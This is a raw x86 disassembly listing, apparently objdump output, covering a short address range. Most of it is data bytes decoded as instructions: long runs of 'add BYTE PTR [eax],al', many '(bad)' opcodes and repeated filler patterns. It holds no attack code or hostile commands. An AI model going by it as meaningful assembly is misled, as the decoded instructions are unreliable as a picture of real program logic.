110142c1:	add    BYTE PTR [eax],al
110142c3:	inc    DWORD PTR [ebp+0x27]
110142c6:	sbb    edi,edi
110142c8:	jb     0x1101430a
110142ca:	sub    bh,bh
110142cc:	ja     0x11014311
110142ce:	sub    al,0xff
110142d0:	jns    0x11014316
110142d2:	sub    eax,0x2d4479ff
110142d7:	(bad)  
110142d8:	jns    0x1101431e
110142da:	sub    eax,0x2d4479ff
110142df:	(bad)  
110142e0:	jns    0x11014326
110142e2:	sub    eax,0x2d4479ff
110142e7:	(bad)  
110142e8:	cmp    al,0x22
110142ea:	push   ss
110142eb:	inc    DWORD PTR [eax]
110142ed:	add    BYTE PTR [eax],al
110142ef:	inc    DWORD PTR [eax]
110142f1:	add    BYTE PTR [eax],al
110142f3:	pop    edi
110142f4:	add    BYTE PTR [eax],al
110142f6:	add    BYTE PTR [eax+0x0],al
110142f9:	add    BYTE PTR [eax],al
110142fb:	and    DWORD PTR [eax],eax
110142fd:	add    BYTE PTR [eax],al
110142ff:	or     al,0x0
11014301:	add    BYTE PTR [eax],al
11014303:	add    eax,DWORD PTR [eax]
	...
11014319:	add    BYTE PTR [eax],al
1101431b:	add    DWORD PTR [eax],eax
1101431d:	add    BYTE PTR [eax],al
1101431f:	push   es
11014320:	add    BYTE PTR [eax],al
11014322:	add    bh,bh
11014324:	add    BYTE PTR [eax],al
11014326:	add    bh,bh
11014328:	add    BYTE PTR [eax],al
1101432a:	add    bh,bh
1101432c:	add    BYTE PTR [eax],al
1101432e:	add    bh,bh
11014330:	add    BYTE PTR [eax],al
11014332:	add    bh,bh
11014334:	add    BYTE PTR [eax],al
11014336:	add    bh,bh
11014338:	add    BYTE PTR [eax],al
1101433a:	add    bh,bh
1101433c:	add    BYTE PTR [eax],al
1101433e:	add    bh,bh
11014340:	add    BYTE PTR [eax],al
11014342:	add    bh,bh
11014344:	add    BYTE PTR [eax],al
11014346:	add    bh,bh
11014348:	add    BYTE PTR [eax],al
1101434a:	add    bh,bh
1101434c:	add    BYTE PTR [eax],al
1101434e:	add    bh,bh
11014350:	add    BYTE PTR [eax],al
11014352:	add    bh,bh
11014354:	and    BYTE PTR [eax],ah
11014356:	and    bh,bh
11014358:	fcmovnu st,st(3)
1101435a:	(bad)  
1101435c:	std    
1101435d:	std    
1101435e:	std    
1101435f:	(bad)  
11014360:	std    
11014361:	std    
11014362:	std    
11014363:	(bad)  
11014364:	(bad)  
11014365:	(bad)  
11014366:	(bad)  
11014367:	(bad)  
11014368:	std    
11014369:	std    
1101436a:	std    
1101436b:	(bad)  
1101436c:	std    
1101436d:	std    
1101436e:	std    
1101436f:	(bad)  
11014370:	(bad)  
11014371:	(bad)  
11014372:	(bad)  
11014373:	(bad)  
11014374:	fcmovu st,st(2)
11014376:	(bad)  
11014378:	pop    ds
11014379:	pop    ds
1101437a:	pop    ds
1101437b:	inc    DWORD PTR [eax]
1101437d:	add    BYTE PTR [eax],al
1101437f:	inc    DWORD PTR [eax]
11014381:	add    BYTE PTR [eax],al
11014383:	inc    DWORD PTR [eax]
11014385:	add    BYTE PTR [eax],al
11014387:	inc    DWORD PTR [eax]
11014389:	add    BYTE PTR [eax],al
1101438b:	inc    DWORD PTR [eax]
1101438d:	add    BYTE PTR [eax],al
1101438f:	inc    DWORD PTR [eax]
11014391:	add    BYTE PTR [eax],al
11014393:	inc    DWORD PTR [eax]
11014395:	add    BYTE PTR [eax],al
11014397:	inc    DWORD PTR [eax]
11014399:	add    BYTE PTR [eax],al
1101439b:	inc    DWORD PTR [eax]
1101439d:	add    BYTE PTR [eax],al
1101439f:	inc    DWORD PTR [eax]
110143a1:	add    BYTE PTR [eax],al
110143a3:	inc    DWORD PTR [eax]
110143a5:	add    BYTE PTR [eax],al
110143a7:	inc    DWORD PTR [eax]
110143a9:	add    BYTE PTR [eax],al
110143ab:	inc    DWORD PTR [eax]
110143ad:	add    BYTE PTR [eax],al
110143af:	inc    DWORD PTR [eax]
110143b1:	add    BYTE PTR [eax],al
110143b3:	xor    DWORD PTR [eax],eax
110143b5:	add    BYTE PTR [eax],al
110143b7:	and    DWORD PTR [eax],eax
110143b9:	add    BYTE PTR [eax],al
110143bb:	adc    DWORD PTR [eax],eax
110143bd:	add    BYTE PTR [eax],al
110143bf:	push   es
110143c0:	add    BYTE PTR [eax],al
110143c2:	add    BYTE PTR [ecx],al
	...
110143dc:	add    BYTE PTR [eax],al
110143de:	add    BYTE PTR [edx],al
110143e0:	add    BYTE PTR [eax],al
110143e2:	add    BYTE PTR [esi],al
110143e4:	add    BYTE PTR [eax],al
110143e6:	add    BYTE PTR [eax+eax*1],cl
110143e9:	add    BYTE PTR [eax],al
110143eb:	adc    al,BYTE PTR [eax]
110143ed:	add    BYTE PTR [eax],al
110143ef:	push   ss
110143f0:	add    BYTE PTR [eax],al
110143f2:	add    BYTE PTR [edi],dl
110143f4:	add    BYTE PTR [eax],al
110143f6:	add    BYTE PTR [eax],bl
110143f8:	add    BYTE PTR [eax],al
110143fa:	add    BYTE PTR [eax],bl
110143fc:	add    BYTE PTR [eax],al
110143fe:	add    BYTE PTR [eax],bl
11014400:	add    BYTE PTR [eax],al
11014402:	add    BYTE PTR [eax],bl
11014404:	add    BYTE PTR [eax],al
11014406:	add    BYTE PTR [eax],bl
11014408:	add    BYTE PTR [eax],al
1101440a:	add    BYTE PTR [ebx],bl
1101440c:	add    BYTE PTR [eax],al
1101440e:	add    BYTE PTR [ebx],ah
11014410:	add    BYTE PTR [eax],al
11014412:	add    BYTE PTR [ebp+0x0],dl
11014415:	add    BYTE PTR [eax],al
11014417:	in     al,dx
11014418:	push   ds
11014419:	push   ds
1101441a:	push   ds
1101441b:	(bad)  
1101441c:	fcmovnu st,st(3)
1101441e:	(bad)  
11014420:	(bad)  
11014421:	(bad)  
11014422:	(bad)  
11014423:	(bad)  
11014424:	(bad)  
11014425:	(bad)  
11014426:	(bad)  
11014427:	(bad)  
11014428:	(bad)  
11014429:	(bad)  
1101442a:	(bad)  
1101442b:	(bad)  
1101442c:	(bad)  
1101442d:	(bad)  
1101442e:	(bad)  
1101442f:	(bad)  
11014430:	fcmovu st,st(2)
11014432:	(bad)  
11014434:	sbb    eax,0xff1d1d
11014439:	add    BYTE PTR [eax],al
1101443b:	jmp    0x1101443d
1101443d:	add    BYTE PTR [eax],al
1101443f:	push   esp
11014440:	add    BYTE PTR [eax],al
11014442:	add    BYTE PTR [ebx],ah
11014444:	add    BYTE PTR [eax],al
11014446:	add    BYTE PTR [ebx],bl
11014448:	add    BYTE PTR [eax],al
1101444a:	add    BYTE PTR [eax],bl
1101444c:	add    BYTE PTR [eax],al
1101444e:	add    BYTE PTR [eax],bl
11014450:	add    BYTE PTR [eax],al
11014452:	add    BYTE PTR [eax],bl
11014454:	add    BYTE PTR [eax],al
11014456:	add    BYTE PTR [eax],bl
11014458:	add    BYTE PTR [eax],al
1101445a:	add    BYTE PTR [eax],bl
1101445c:	add    BYTE PTR [eax],al
1101445e:	add    BYTE PTR [eax],bl
11014460:	add    BYTE PTR [eax],al
11014462:	add    BYTE PTR [eax],bl
11014464:	add    BYTE PTR [eax],al
11014466:	add    BYTE PTR [eax],bl
11014468:	add    BYTE PTR [eax],al
1101446a:	add    BYTE PTR [edi],dl
1101446c:	add    BYTE PTR [eax],al
1101446e:	add    BYTE PTR [esi],dl
11014470:	add    BYTE PTR [eax],al
11014472:	add    BYTE PTR [edx],dl
11014474:	add    BYTE PTR [eax],al
11014476:	add    BYTE PTR [eax+eax*1],cl
11014479:	add    BYTE PTR [eax],al
1101447b:	push   es
1101447c:	add    BYTE PTR [eax],al
1101447e:	add    BYTE PTR [edx],al
	...
110144a0:	add    BYTE PTR [eax],al
110144a2:	add    BYTE PTR [ecx],al
110144a4:	add    BYTE PTR [eax],al
110144a6:	add    BYTE PTR [ebx],al
110144a8:	add    BYTE PTR [eax],al
110144aa:	add    BYTE PTR [eax+eax*1],al
110144ad:	add    BYTE PTR [eax],al
110144af:	add    eax,0x5000000
110144b4:	add    BYTE PTR [eax],al
110144b6:	add    BYTE PTR [esi],al
110144b8:	add    BYTE PTR [eax],al
110144ba:	add    BYTE PTR [esi],al
110144bc:	add    BYTE PTR [eax],al
110144be:	add    BYTE PTR [esi],al
110144c0:	add    BYTE PTR [eax],al
110144c2:	add    BYTE PTR [esi],al
110144c4:	add    BYTE PTR [eax],al
110144c6:	add    BYTE PTR [esi],al
110144c8:	add    BYTE PTR [eax],al
110144ca:	add    BYTE PTR [esi],al
110144cc:	add    BYTE PTR [eax],al
110144ce:	add    BYTE PTR [ecx],cl
110144d0:	add    BYTE PTR [eax],al
110144d2:	add    BYTE PTR [edx],dl
110144d4:	add    BYTE PTR [eax],al
110144d6:	add    BYTE PTR [ecx+0x0],cl
110144d9:	add    BYTE PTR [eax],al
110144db:	jmp    0x110144fd
110144dd:	and    BYTE PTR [eax],ah
110144df:	(bad)  
110144e0:	fcmovu st,st(2)
110144e2:	(bad)  
110144e4:	(bad)  
110144e5:	(bad)  
110144e6:	(bad)  
110144e7:	(bad)  
110144e8:	std    
110144e9:	std    
110144ea:	std    
110144eb:	(bad)  
110144ec:	(bad)  
110144ee:	fcos   
110144f0:	pop    ds
110144f1:	pop    ds
110144f2:	pop    ds
110144f3:	inc    BYTE PTR [eax]
110144f5:	add    BYTE PTR [eax],al
110144f7:	jmp    0x0:0x48000000
110144fe:	add    BYTE PTR [edx],dl
11014500:	add    BYTE PTR [eax],al
11014502:	add    BYTE PTR [ecx],cl
11014504:	add    BYTE PTR [eax],al
11014506:	add    BYTE PTR [esi],al
11014508:	add    BYTE PTR [eax],al
1101450a:	add    BYTE PTR [esi],al
1101450c:	add    BYTE PTR [eax],al
1101450e:	add    BYTE PTR [esi],al
11014510:	add    BYTE PTR [eax],al
11014512:	add    BYTE PTR [esi],al
11014514:	add    BYTE PTR [eax],al
11014516:	add    BYTE PTR [esi],al
11014518:	add    BYTE PTR [eax],al
1101451a:	add    BYTE PTR [esi],al
1101451c:	add    BYTE PTR [eax],al
1101451e:	add    BYTE PTR [esi],al
11014520:	add    BYTE PTR [eax],al
11014522:	add    BYTE PTR [esi],al
11014524:	add    BYTE PTR [eax],al
11014526:	add    BYTE PTR [esi],al
11014528:	add    BYTE PTR [eax],al
1101452a:	add    BYTE PTR ds:0x5000000,al
11014530:	add    BYTE PTR [eax],al
11014532:	add    BYTE PTR [eax+eax*1],al
11014535:	add    BYTE PTR [eax],al
11014537:	add    eax,DWORD PTR [eax]
11014539:	add    BYTE PTR [eax],al
1101453b:	add    DWORD PTR [eax],eax
	...
1101458d:	add    BYTE PTR [eax],al
1101458f:	add    DWORD PTR [eax],eax
11014591:	add    BYTE PTR [eax],al
11014593:	add    al,0x0
11014595:	add    BYTE PTR [eax],al
11014597:	or     eax,0x45000000
1101459c:	add    BYTE PTR [eax],al
1101459e:	add    ch,ch
110145a0:	and    BYTE PTR [eax],ah
110145a2:	and    dh,bh
110145a4:	fcmovnu st,st(3)
110145a6:	(bad)  
110145a8:	fcmovu st,st(2)
110145aa:	(bad)  
110145ac:	pop    ds
110145ad:	pop    ds
110145ae:	pop    ds
110145af:	inc    BYTE PTR [eax]
110145b1:	add    BYTE PTR [eax],al
110145b3:	in     al,dx
110145b4:	add    BYTE PTR [eax],al
110145b6:	add    BYTE PTR [eax+eax*1+0x0],al
110145ba:	add    BYTE PTR ds:0x4000000,cl
110145c0:	add    BYTE PTR [eax],al
110145c2:	add    BYTE PTR [ecx],al
	...
11014654:	add    BYTE PTR [eax],al
11014656:	add    BYTE PTR [ebx],al
11014658:	add    BYTE PTR [eax],al
1101465a:	add    BYTE PTR [eax+eax*1],cl
1101465d:	add    BYTE PTR [eax],al
1101465f:	inc    edx
11014660:	add    BYTE PTR [eax],al
11014662:	add    dl,ch
11014664:	push   ds
11014665:	push   ds
11014666:	push   ds
11014667:	(bad)  
11014668:	sbb    eax,0xfe1d1d
1101466d:	add    BYTE PTR [eax],al
1101466f:	jmp    0x52014674
11014674:	add    BYTE PTR [eax],al
11014676:	add    BYTE PTR [eax+eax*1],cl
11014679:	add    BYTE PTR [eax],al
1101467b:	add    eax,DWORD PTR [eax]
	...
11014719:	add    BYTE PTR [eax],al
1101471b:	add    eax,DWORD PTR [eax]
1101471d:	add    BYTE PTR [eax],al
1101471f:	or     DWORD PTR [eax],eax
11014721:	add    BYTE PTR [eax],al
11014723:	cmp    eax,0xe9000000
11014728:	add    BYTE PTR [eax],al
1101472a:	add    al,ch
1101472c:	add    BYTE PTR [eax],al
1101472e:	add    BYTE PTR [ebx],bh
11014730:	add    BYTE PTR [eax],al
11014732:	add    BYTE PTR [ecx],cl
11014734:	add    BYTE PTR [eax],al
11014736:	add    BYTE PTR [ebx],al
	...
110147dc:	add    BYTE PTR [eax],al
110147de:	add    BYTE PTR [edx],al
110147e0:	add    BYTE PTR [eax],al
110147e2:	add    BYTE PTR ds:0x34000000,al
110147e8:	add    BYTE PTR [eax],al
110147ea:	add    BYTE PTR [ebx],dh
110147ec:	add    BYTE PTR [eax],al
110147ee:	add    BYTE PTR ds:0x2000000,al
	...
11014848:	(bad)  
11014849:	inc    DWORD PTR [eax]
1101484b:	add    bh,bh
1101484d:	inc    DWORD PTR [eax]
1101484f:	push   cs
11014850:	cld    
11014851:	add    BYTE PTR [eax],al
11014853:	add    BYTE PTR [eax],al
11014855:	pop    es
11014856:	add    BYTE PTR [esi],cl
11014858:	clc    
11014859:	add    BYTE PTR [eax],al
1101485b:	add    BYTE PTR [eax],al
1101485d:	add    eax,DWORD PTR [eax]
1101485f:	push   cs
11014860:	lock add BYTE PTR [eax],al
11014863:	add    BYTE PTR [eax],al
11014865:	add    DWORD PTR [eax],eax
11014867:	push   cs
11014868:	lock add BYTE PTR [eax],al
1101486b:	add    BYTE PTR [eax],al
1101486d:	add    DWORD PTR [eax],eax
1101486f:	push   cs
11014870:	lock add BYTE PTR [eax],al
11014873:	add    BYTE PTR [eax],al
11014875:	add    DWORD PTR [eax],eax
11014877:	push   cs
11014878:	lock add BYTE PTR [eax],al
1101487b:	add    BYTE PTR [eax],al
1101487d:	add    DWORD PTR [eax],eax
1101487f:	push   cs
11014880:	lock add BYTE PTR [eax],al
11014883:	add    BYTE PTR [eax],al
11014885:	add    DWORD PTR [eax],eax
11014887:	push   cs
11014888:	lock add BYTE PTR [eax],al
1101488b:	add    BYTE PTR [eax],al
1101488d:	add    DWORD PTR [eax],eax
1101488f:	push   cs
11014890:	lock add BYTE PTR [eax],al
11014893:	add    BYTE PTR [eax],al
11014895:	add    DWORD PTR [eax],eax
11014897:	push   cs
11014898:	lock add BYTE PTR [eax],al
1101489b:	add    BYTE PTR [eax],al
1101489d:	add    DWORD PTR [eax],eax
1101489f:	push   cs
110148a0:	lock add BYTE PTR [eax],al
110148a3:	add    BYTE PTR [eax],al
110148a5:	add    DWORD PTR [eax],eax
110148a7:	push   cs
110148a8:	lock add BYTE PTR [eax],al
110148ab:	add    BYTE PTR [eax],al
110148ad:	add    DWORD PTR [eax],eax
110148af:	push   cs
110148b0:	loopne 0x110148b2
110148b2:	add    BYTE PTR [eax],al
110148b4:	add    BYTE PTR [ecx],al
110148b6:	add    BYTE PTR [esi],cl
110148b8:	rol    BYTE PTR [eax],0x0
110148bb:	add    BYTE PTR [eax],al
110148bd:	add    DWORD PTR [eax],eax
110148bf:	push   cs
110148c0:	add    BYTE PTR [eax],0x0
110148c3:	add    BYTE PTR [eax],al
110148c5:	add    DWORD PTR [eax],eax
110148c7:	push   cs
110148c8:	add    BYTE PTR [eax],al
110148ca:	add    BYTE PTR [eax],al
110148cc:	add    BYTE PTR [eax],al
110148ce:	add    BYTE PTR [esi],cl
110148d0:	add    BYTE PTR [eax],al
110148d2:	add    BYTE PTR [eax],al
110148d4:	add    BYTE PTR [eax],al
110148d6:	add    BYTE PTR [esi],cl
110148d8:	add    BYTE PTR [eax],al
110148da:	add    BYTE PTR [eax],al
110148dc:	add    BYTE PTR [eax],al
110148de:	add    BYTE PTR [esi],cl
110148e0:	add    BYTE PTR [eax],al
110148e2:	add    BYTE PTR [eax],al
110148e4:	add    BYTE PTR [eax],al
110148e6:	add    BYTE PTR [esi],cl
110148e8:	add    BYTE PTR [eax],al
110148ea:	add    BYTE PTR [eax],al
110148ec:	add    BYTE PTR [eax],al
110148ee:	add    BYTE PTR [esi],cl
110148f0:	add    BYTE PTR [eax],al
110148f2:	add    BYTE PTR [eax],al
110148f4:	add    BYTE PTR [eax],al
110148f6:	add    BYTE PTR [esi],cl
110148f8:	add    BYTE PTR [eax],al
110148fa:	add    BYTE PTR [eax],al
110148fc:	add    BYTE PTR [eax],al
110148fe:	add    BYTE PTR [esi],cl
11014900:	add    BYTE PTR [eax],al
11014902:	add    BYTE PTR [eax],al
11014904:	add    BYTE PTR [eax],al
11014906:	add    BYTE PTR [esi],cl
11014908:	add    BYTE PTR [eax],al
1101490a:	add    BYTE PTR [eax],al
1101490c:	add    BYTE PTR [eax],al
1101490e:	add    BYTE PTR [esi],cl
11014910:	add    BYTE PTR [eax],al
11014912:	add    BYTE PTR [eax],al
11014914:	add    BYTE PTR [eax],al
11014916:	add    BYTE PTR [esi],cl
11014918:	add    BYTE PTR [eax],al
1101491a:	add    BYTE PTR [eax],al
1101491c:	add    BYTE PTR [eax],al
1101491e:	add    BYTE PTR [esi],cl
11014920:	add    BYTE PTR [eax],0x0
11014923:	add    BYTE PTR [eax],al
11014925:	add    BYTE PTR [eax],al
11014927:	push   cs
11014928:	rol    BYTE PTR [eax],0x0
1101492b:	add    BYTE PTR [eax],al
1101492d:	add    DWORD PTR [eax],eax
1101492f:	push   cs
11014930:	loopne 0x11014932
11014932:	add    BYTE PTR [eax],al
11014934:	add    BYTE PTR [ecx],al
11014936:	add    BYTE PTR [esi],cl
11014938:	loopne 0x1101493a
1101493a:	add    BYTE PTR [eax],al
1101493c:	add    BYTE PTR [ecx],al
1101493e:	add    BYTE PTR [esi],cl
11014940:	lock add BYTE PTR [eax],al
11014943:	add    BYTE PTR [eax],al
11014945:	add    DWORD PTR [eax],eax
11014947:	push   cs
11014948:	lock add BYTE PTR [eax],al
1101494b:	add    BYTE PTR [eax],al
1101494d:	add    DWORD PTR [eax],eax
1101494f:	push   cs
11014950:	lock add BYTE PTR [eax],al
11014953:	add    BYTE PTR [eax],al
11014955:	add    DWORD PTR [eax],eax
11014957:	push   cs
11014958:	lock add BYTE PTR [eax],al
1101495b:	add    BYTE PTR [eax],al
1101495d:	add    DWORD PTR [eax],eax
1101495f:	push   cs
11014960:	lock add BYTE PTR [eax],al
11014963:	add    BYTE PTR [eax],al
11014965:	add    DWORD PTR [eax],eax
11014967:	push   cs
11014968:	lock add BYTE PTR [eax],al
1101496b:	add    BYTE PTR [eax],al
1101496d:	add    DWORD PTR [eax],eax
1101496f:	push   cs
11014970:	lock add BYTE PTR [eax],al
11014973:	add    BYTE PTR [eax],al
11014975:	add    DWORD PTR [eax],eax
11014977:	push   cs
11014978:	lock add BYTE PTR [eax],al
1101497b:	add    BYTE PTR [eax],al
1101497d:	add    DWORD PTR [eax],eax
1101497f:	push   cs
11014980:	lock add BYTE PTR [eax],al
11014983:	add    BYTE PTR [eax],al
11014985:	add    DWORD PTR [eax],eax
11014987:	push   cs
11014988:	lock add BYTE PTR [eax],al
1101498b:	add    BYTE PTR [eax],al
1101498d:	add    DWORD PTR [eax],eax
1101498f:	push   cs
11014990:	lock add BYTE PTR [eax],al
11014993:	add    BYTE PTR [eax],al
11014995:	add    DWORD PTR [eax],eax
11014997:	push   cs
11014998:	clc    
11014999:	add    BYTE PTR [eax],al
1101499b:	add    BYTE PTR [eax],al
1101499d:	add    eax,DWORD PTR [eax]
1101499f:	push   cs
110149a0:	cld    
110149a1:	add    BYTE PTR [eax],al
110149a3:	add    BYTE PTR [eax],al
110149a5:	pop    es
110149a6:	add    BYTE PTR [esi],cl
110149a8:	(bad)  
110149a9:	inc    DWORD PTR [eax+0xffff01]
110149af:	push   cs
110149b0:	(bad)  
110149b1:	jmp    eax
110149b3:	pop    es
110149b4:	(bad)  
110149b5:	inc    DWORD PTR [eax]
110149b7:	push   cs
110149b8:	(bad)  
110149b9:	push   eax
110149bb:	ud0    edi,edi
110149be:	add    BYTE PTR [esi],cl
110149c0:	(bad)  
110149c1:	(bad)  
110149c2:	clc    
110149c3:	pop    ds
110149c4:	(bad)  
110149c5:	inc    DWORD PTR [eax]
110149c7:	push   cs
110149c8:	sub    BYTE PTR [eax],al
110149ca:	add    BYTE PTR [eax],al
110149cc:	sub    BYTE PTR [eax],al
110149ce:	add    BYTE PTR [eax],al
110149d0:	push   eax
110149d1:	add    BYTE PTR [eax],al
110149d3:	add    BYTE PTR [ecx],al
110149d5:	add    BYTE PTR [eax],ah
	...
11014a0f:	add    DWORD PTR [eax],eax
11014a11:	add    BYTE PTR [eax],al
11014a13:	add    DWORD PTR [eax],eax
11014a15:	add    BYTE PTR [eax],al
11014a17:	add    DWORD PTR [eax],eax
11014a19:	add    BYTE PTR [eax],al
11014a1b:	add    DWORD PTR [eax],eax
11014a1d:	add    BYTE PTR [eax],al
11014a1f:	add    DWORD PTR [eax],eax
11014a21:	add    BYTE PTR [eax],al
11014a23:	add    DWORD PTR [eax],eax
11014a25:	add    BYTE PTR [eax],al
11014a27:	add    DWORD PTR [eax],eax
11014a29:	add    BYTE PTR [eax],al
11014a2b:	push   es
11014a2c:	add    BYTE PTR [eax],al
11014a2e:	add    BYTE PTR [eax+eax*1],dl
11014a31:	add    BYTE PTR [eax],al
11014a33:	xor    DWORD PTR [eax],eax
11014a35:	add    BYTE PTR [eax],al
11014a37:	pusha  
11014a38:	add    BYTE PTR [eax],al
11014a3a:	add    BYTE PTR [ebx-0x3f000000],dl
11014a40:	add    BYTE PTR [eax],al
11014a42:	add    cl,al
11014a44:	add    BYTE PTR [eax],al
11014a46:	add    BYTE PTR [ebx+0x5f000000],dl
11014a4c:	add    BYTE PTR [eax],al
11014a4e:	add    BYTE PTR [ecx],dh
11014a50:	add    BYTE PTR [eax],al
11014a52:	add    BYTE PTR [eax+eax*1],dl
11014a55:	add    BYTE PTR [eax],al
11014a57:	push   es
11014a58:	add    BYTE PTR [eax],al
11014a5a:	add    BYTE PTR [ecx],al
11014a5c:	add    BYTE PTR [eax],al
11014a5e:	add    BYTE PTR [ecx],al
11014a60:	add    BYTE PTR [eax],al
11014a62:	add    BYTE PTR [ecx],al
11014a64:	add    BYTE PTR [eax],al
11014a66:	add    BYTE PTR [ecx],al
11014a68:	add    BYTE PTR [eax],al
11014a6a:	add    BYTE PTR [ecx],al
11014a6c:	add    BYTE PTR [eax],al
11014a6e:	add    BYTE PTR [ecx],al
11014a70:	add    BYTE PTR [eax],al
11014a72:	add    BYTE PTR [ecx],al
11014a74:	add    BYTE PTR [eax],al
11014a76:	add    BYTE PTR [ecx],al
11014a78:	add    BYTE PTR [eax],al
11014a7a:	add    BYTE PTR [ecx],al
11014a7c:	add    BYTE PTR [eax],al
11014a7e:	add    BYTE PTR [ecx],al
	...
11014aa0:	add    BYTE PTR [eax],al
11014aa2:	add    BYTE PTR [ecx],al
11014aa4:	add    BYTE PTR [eax],al
11014aa6:	add    BYTE PTR [ebx],al
11014aa8:	add    BYTE PTR [eax],al
11014aaa:	add    BYTE PTR [esi],al
11014aac:	add    BYTE PTR [eax],al
11014aae:	add    BYTE PTR [eax],cl
11014ab0:	add    BYTE PTR [eax],al
11014ab2:	add    BYTE PTR [ecx],cl
11014ab4:	add    BYTE PTR [eax],al
11014ab6:	add    BYTE PTR [edx],cl
11014ab8:	add    BYTE PTR [eax],al
11014aba:	add    BYTE PTR [edx],cl
11014abc:	add    BYTE PTR [eax],al
11014abe:	add    BYTE PTR [edx],cl
11014ac0:	add    BYTE PTR [eax],al
11014ac2:	add    BYTE PTR [edx],cl
11014ac4:	add    BYTE PTR [eax],al
11014ac6:	add    BYTE PTR [edi],cl
11014ac8:	add    BYTE PTR [eax],al
11014aca:	add    BYTE PTR [eax+eax*1],bl
11014acd:	add    BYTE PTR [eax],al
11014acf:	cmp    DWORD PTR [eax],eax
11014ad1:	add    BYTE PTR [eax],al
11014ad3:	add    BYTE PTR gs:[eax],al
11014ad6:	add    BYTE PTR [edx-0x30000000],bl
11014adc:	add    BYTE PTR [eax],al
11014ade:	add    ah,bh
11014ae0:	add    BYTE PTR [eax],al
11014ae2:	add    ah,bh
11014ae4:	add    BYTE PTR [eax],al
11014ae6:	add    al,dl
11014ae8:	add    BYTE PTR [eax],al
11014aea:	add    BYTE PTR [edx+0x65000000],bl
11014af0:	add    BYTE PTR [eax],al
11014af2:	add    BYTE PTR [eax],bh
11014af4:	add    BYTE PTR [eax],al
11014af6:	add    BYTE PTR [eax+eax*1],bl
11014af9:	add    BYTE PTR [eax],al
11014afb:	sldt   WORD PTR [eax]
11014afe:	add    BYTE PTR [edx],cl
11014b00:	add    BYTE PTR [eax],al
11014b02:	add    BYTE PTR [edx],cl
11014b04:	add    BYTE PTR [eax],al
11014b06:	add    BYTE PTR [edx],cl
11014b08:	add    BYTE PTR [eax],al
11014b0a:	add    BYTE PTR [edx],cl
11014b0c:	add    BYTE PTR [eax],al
11014b0e:	add    BYTE PTR [edx],cl
11014b10:	add    BYTE PTR [eax],al
11014b12:	add    BYTE PTR [edx],cl
11014b14:	add    BYTE PTR [eax],al
11014b16:	add    BYTE PTR [ecx],cl
11014b18:	add    BYTE PTR [eax],al
11014b1a:	add    BYTE PTR [ecx],cl
11014b1c:	add    BYTE PTR [eax],al
11014b1e:	add    BYTE PTR [edi],al
11014b20:	add    BYTE PTR [eax],al
11014b22:	add    BYTE PTR [eax+eax*1],al
11014b25:	add    BYTE PTR [eax],al
11014b27:	add    al,BYTE PTR [eax]
	...
11014b41:	add    BYTE PTR [eax],al
11014b43:	add    al,0x0
11014b45:	add    BYTE PTR [eax],al
11014b47:	or     al,0x0
11014b49:	add    BYTE PTR [eax],al
11014b4b:	sbb    BYTE PTR [eax],al
11014b4d:	add    BYTE PTR [eax],al
11014b4f:	and    eax,DWORD PTR [eax]
11014b51:	add    BYTE PTR [eax],al
11014b53:	sub    BYTE PTR [eax],al
11014b55:	add    BYTE PTR [eax],al
11014b57:	sub    al,BYTE PTR [eax]
11014b59:	add    BYTE PTR [eax],al
11014b5b:	sub    al,BYTE PTR [eax]
11014b5d:	add    BYTE PTR [eax],al
11014b5f:	sub    al,BYTE PTR [eax]
11014b61:	add    BYTE PTR [eax],al
11014b63:	add    BYTE PTR cs:[eax],al
11014b66:	add    BYTE PTR [edx],bh
11014b68:	add    BYTE PTR [eax],al
11014b6a:	add    BYTE PTR [edx+0x0],dl
11014b6d:	add    BYTE PTR [eax],al
11014b6f:	jns    0x11014b71
11014b71:	add    BYTE PTR [eax],al
11014b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11014b74:	add    BYTE PTR [eax],al
11014b76:	add    dh,dl
11014b78:	add    BYTE PTR [eax],al
11014b7a:	add    ah,bh
11014b7c:	addr16 addr16 jmp DWORD PTR [di+0x65]
11014b82:	inc    DWORD PTR gs:[eax]
11014b85:	add    BYTE PTR [eax],al
11014b87:	cld    
11014b88:	add    BYTE PTR [eax],al
11014b8a:	add    dh,dl
11014b8c:	add    BYTE PTR [eax],al
11014b8e:	add    BYTE PTR [esi+0x78000000],ah
11014b94:	add    BYTE PTR [eax],al
11014b96:	add    BYTE PTR [edx+0x0],dl
11014b99:	add    BYTE PTR [eax],al
11014b9b:	cmp    DWORD PTR [eax],eax
11014b9d:	add    BYTE PTR [eax],al
11014b9f:	add    BYTE PTR cs:[eax],al
11014ba2:	add    BYTE PTR [edx],ch
11014ba4:	add    BYTE PTR [eax],al
11014ba6:	add    BYTE PTR [edx],ch
11014ba8:	add    BYTE PTR [eax],al
11014baa:	add    BYTE PTR [edx],ch
11014bac:	add    BYTE PTR [eax],al
11014bae:	add    BYTE PTR [edx],ch
11014bb0:	add    BYTE PTR [eax],al
11014bb2:	add    BYTE PTR [edx],ch
11014bb4:	add    BYTE PTR [eax],al
11014bb6:	add    BYTE PTR [ecx],ch
11014bb8:	add    BYTE PTR [eax],al
11014bba:	add    BYTE PTR [esi],ah
11014bbc:	add    BYTE PTR [eax],al
11014bbe:	add    BYTE PTR [esi],bl
11014bc0:	add    BYTE PTR [eax],al
11014bc2:	add    BYTE PTR [edx],dl
11014bc4:	add    BYTE PTR [eax],al
11014bc6:	add    BYTE PTR [edi],al
11014bc8:	add    BYTE PTR [eax],al
11014bca:	add    BYTE PTR [edx],al
	...
11014bdc:	add    BYTE PTR [eax],al
11014bde:	add    BYTE PTR [ecx],al
11014be0:	add    BYTE PTR [eax],al
11014be2:	add    BYTE PTR [ecx],cl
11014be4:	add    BYTE PTR [eax],al
11014be6:	add    BYTE PTR [esi],bl
11014be8:	add    BYTE PTR [eax],al
11014bea:	add    BYTE PTR [esi],bh
11014bec:	add    BYTE PTR [eax],al
11014bee:	add    BYTE PTR [edx+0x0],bl
11014bf1:	add    BYTE PTR [eax],al
11014bf3:	push   0x6b000000
11014bf8:	add    BYTE PTR [eax],al
11014bfa:	add    BYTE PTR [eax+eax*1+0x0],ch
11014bfe:	add    BYTE PTR [esi+0x0],ch
11014c01:	add    BYTE PTR [eax],al
11014c03:	jbe    0x11014c05
11014c05:	add    BYTE PTR [eax],al
11014c07:	xchg   DWORD PTR [eax],eax
11014c09:	add    BYTE PTR [eax],al
11014c0b:	mov    eax,ds:0xc1000000
11014c10:	add    BYTE PTR [eax],al
11014c12:	add    cl,ah
11014c14:	add    BYTE PTR [eax],al
11014c16:	add    ch,bh
11014c18:	push   0xfbff6868
11014c1d:	sti    
11014c1e:	sti    
11014c1f:	(bad)  
11014c20:	cli    
